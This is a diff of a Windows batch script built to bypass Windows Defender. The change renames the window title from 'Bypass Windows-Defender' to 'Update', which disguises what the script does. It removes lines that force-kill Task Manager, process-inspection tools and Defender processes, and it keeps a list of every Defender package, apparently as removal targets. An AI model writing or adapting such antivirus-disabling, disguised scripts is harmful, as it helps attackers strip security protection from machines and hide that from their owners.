@@ -1,19 +1,7 @@
 @echo off
 pushd "%CD%"
 CD /D "%~dp0"
-title [0 percent] Bypass Windows-Defender
-
-:: Kill processes
-taskkill /f /im Taskmgr.exe
-taskkill /f /im ProcessHacker.exe
-taskkill /f /im procexp.exe
-taskkill /f /im MSASCui.exe
-taskkill /f /im MsMpEng.exe
-taskkill /f /im MpUXSrv.exe
-taskkill /f /im MpCmdRun.exe
-taskkill /f /im NisSrv.exe
-taskkill /f /im UserAccountControlSettings.exe
-taskkill /f /im taskkill.exe
+title [0 percent] Update
 
 set "defender_packages=Windows-Defender-Nis-Group-Package Windows-Defender-Management-Powershell-Group-Package Windows-Defender-Management-MDM-Group-Package Windows-Defender-Management-Group-Package Windows-Defender-Group-Policy-Package Windows-Defender-Core-Group-Package Windows-Defender-Client-Package Windows-Defender-ApplicationGuard-Inbox-WOW64-Package Windows-Defender-ApplicationGuard-Inbox-Package Windows-Defender-AppLayer-Group-Package Windows-Defender-AM-Default-Definitions-Package Windows-Defender-AM-Default-Definitions-OptionalWrapper-Package"
 
